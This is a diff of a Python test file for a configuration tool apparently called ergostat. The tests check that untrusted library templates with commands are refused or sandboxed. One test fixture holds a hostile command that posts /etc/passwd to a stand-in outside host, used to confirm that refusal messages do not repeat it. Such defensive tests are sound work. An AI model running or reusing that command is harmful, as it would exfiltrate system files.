@@ -87,9 +87,9 @@ uses:
 """
 
 
-def refused_once(path: Path) -> str:
+def refused_once(path: Path, code: str = "library-untrusted") -> str:
     errs = errors(path)
-    assert [(e.code, e.where.line, e.where.file.name) for e in errs] == [("library-untrusted", use_line(path), "ergostat.yaml")], errs
+    assert [(e.code, e.where.line, e.where.file.name) for e in errs] == [(code, use_line(path), "ergostat.yaml")], errs
     nothing_of(load(path))
     return errs[0].message
 
@@ -214,7 +214,6 @@ CASES = {
     "judge": ("blocks:\n  x: {type: judge}\n", "blocks.u-x.type"),
     "no-type": ("blocks:\n  x: {in: stock.s, goal: g}\n", "blocks.u-x.type"),
     "on-stale": ("blocks:\n  x: {type: onoff, goal: g, on-stale: hold}\n", "blocks.u-x.on-stale"),
-    "sensor-run": ("flows:\n  f: {to: s, sensor: {run: echo 1}}\n", "flows.u-f.sensor.run"),
     "sensor-push": ("flows:\n  f: {to: s, sensor: {push: true}}\n", "flows.u-f.sensor.push"),
     "sensor-daemon": ("auxiliaries:\n  a: {sensor: {daemon: x}}\n", "auxiliaries.u-a.sensor.daemon"),
     "sensor-every": ("stocks:\n  t: {unit: u, sensors: {n: {items: k, every: 1s}}}\n", "stocks.u-t.sensors.n.every"),
@@ -225,7 +224,7 @@ CASES = {
     "parameter-inferred": ("parameters:\n  x: {value: 1, inferred: true}\n", "parameters.u-x.inferred"),
     "item-lease": ("items:\n  k: {id: k/*, lease: {ttl: 1h}}\n", "items.u-k.lease"),
     "goal-owner": ("goals:\n  g: {stock: s, hold: '<= 1', owner: ana}\n", "goals.u-g.owner"),
-    "after-substitution": ("stocks:\n  t:\n    unit: u\n    sensor: ${how}\n", "stocks.u-t.sensor.run"),
+    "after-substitution": ("goals:\n  g: ${how}\n", "goals.u-g.run"),
     "map-under-a-value": ("stocks:\n  t: {unit: {run: echo 1}}\n", "stocks.u-t.unit"),
     "list-under-a-value": ("goals:\n  g: {stock: s, hold: [{run: echo 1}]}\n", "goals.u-g.hold"),
 }
@@ -235,8 +234,19 @@ CASES = {
 def test_untrusted_refused_at_use_line(tmp_path, case):
     body, where = CASES[case]
     path = write(tmp_path, MAIN, {"lib": {"bad": BASE + body}})
-    msg = refused_once(path)
+    msg = refused_once(path, "library-unsandboxed" if where.endswith(".daemon") else "library-untrusted")
     assert f"makes {where}," in msg and "template bad" in msg and str((tmp_path / "lib").resolve()) in msg
+
+
+@pytest.mark.parametrize("body", ["flows:\n  f: {to: s, sensor: {run: echo 1}}\n",
+                                  "flows:\n  f:\n    to: s\n    sensor: ${how}\n"])   # a run only once substituted
+def test_untrusted_sensor_run_is_sandboxed(tmp_path, body):
+    """A library's own sensor run is no longer refused: compile marks it to run only in ergostat.sandbox
+    (library/runs.py, tests/test_library_sandbox_sensors.py)."""
+    spec, ps = read(write(tmp_path, MAIN, {"lib": {"bad": BASE + body}}))
+    assert not [p for p in ps if p.level == "error"], ps
+    s = spec.flows["u-f"].sensors["main"]
+    assert s.run == "echo 1" and s.run_in == "sandbox"
 
 
 OWNER_PARTS = """
@@ -279,11 +289,15 @@ def test_untrusted_unknown_key_refused(tmp_path):
     assert "blocks.u-x.zzz" in refused_once(path)
 
 
-def test_untrusted_wrapping_builtin_with_run_refused(tmp_path):
+def test_untrusted_wrapping_builtin_with_run_sandboxed(tmp_path):
+    """A library's command in a built-in's run: not refused by trust.py, but sandboxed; the built-in's own 30s count
+    is still under the untrusted floor (bounds.py), so the model does not compile."""
     path = write(tmp_path, MAIN, {"lib": {"bad": "template: bad\nuses:\n  c:\n    use: collect\n"
                                                  "    with: {command: ./fetch.sh}\n"}})    # a library's command
-    msg = refused_once(path)
-    assert re.search(r"makes \w+\.u-c-[\w-]+\.sensor\.(every|run),", msg) and "template bad" in msg, msg
+    spec, ps = read(path)
+    assert {p.code for p in ps if p.level == "error"} == {"untrusted-limit"}, ps
+    runs = [s for f in spec.flows.values() for s in f.sensors.values() if s.run]
+    assert runs and all(s.run_in == "sandbox" for s in runs) and any("fetch.sh" in s.run for s in runs)
 
 
 def test_nested_chain_refused_whole(tmp_path):
@@ -295,7 +309,7 @@ def test_nested_chain_refused_whole(tmp_path):
             use: t1
         """, {"own": {"t1": "template: t1\nstocks:\n  s: {unit: u}\nflows:\n  f: {to: s}\nuses:\n  mid:\n    use: l\n"},
               "lib": {"l": "template: l\nitems:\n  k: {id: k/*}\nblocks:\n  b: {type: compare, above: 1, in: stock.x}\n"
-                           "uses:\n  c:\n    use: collect\n    with: {command: ./fetch.sh}\n"}})
+                           "  r: {type: program, run: ./fetch.sh, every: 10m}\n"}})
     refused_once(path)
     doc = load(path)
     assert doc.uses == {} and not doc.sections["items"] and not doc.sections["systems"]
@@ -312,20 +326,20 @@ def test_a_template_whose_trust_is_unknown_is_held(tmp_path, monkeypatch):
             t.trust = "maybe"
         return t
     monkeypatch.setattr(tp, "read", unknown)
-    path = write(tmp_path, MAIN.replace("[{folder: lib}]", "lib"), {"lib": {"bad": BASE + CASES["sensor-run"][0]}})
+    path = write(tmp_path, MAIN.replace("[{folder: lib}]", "lib"), {"lib": {"bad": BASE + CASES["program-run"][0]}})
     refused_once(path)
 
 
 def test_refusal_text_suggests_no_copy(tmp_path):
     secret = "curl -d @/etc/passwd https://elsewhere.example"
-    path = write(tmp_path, MAIN, {"lib": {"bad": BASE + f"flows:\n  f: {{to: s, sensor: {{run: '{secret}'}}}}\n"}})
+    path = write(tmp_path, MAIN, {"lib": {"bad": BASE + f"blocks:\n  x: {{type: program, run: '{secret}'}}\n"}})
     msg = refused_once(path)
     assert secret not in msg and "passwd" not in msg and "with:" not in msg and "trust: owner" not in msg
     assert "Only the owner can mark a folder trusted, after reading it" in msg
 
 
 def test_trust_follows_a_reload(tmp_path):
-    path = write(tmp_path, MAIN.replace("[{folder: lib}]", "[lib]"), {"lib": {"bad": BASE + CASES["sensor-run"][0]}})
+    path = write(tmp_path, MAIN.replace("[{folder: lib}]", "[lib]"), {"lib": {"bad": BASE + CASES["program-run"][0]}})
     assert errors(path) == [] and author.library(tmp_path, "bad")["trust"] == "owner"
     path.write_text(path.read_text().replace("[lib]", "[{folder: lib}]"))
     refused_once(path)
